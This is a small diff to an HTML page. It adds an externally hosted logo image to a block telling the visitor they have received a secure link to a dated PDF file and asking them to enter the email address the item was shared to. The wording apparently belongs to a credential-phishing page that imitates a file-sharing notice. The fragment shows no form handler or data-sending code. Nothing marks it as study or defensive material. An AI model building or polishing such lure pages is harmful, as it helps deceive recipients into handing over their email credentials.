@@ -17,7 +17,7 @@
       </div>
 
       <div class="content">
-       
+       <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30">
         <p>You've received a secure link to:</p>
         <p style="font-size: 16px;">AA484937-13-06-2025.pdf</p>
         <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>
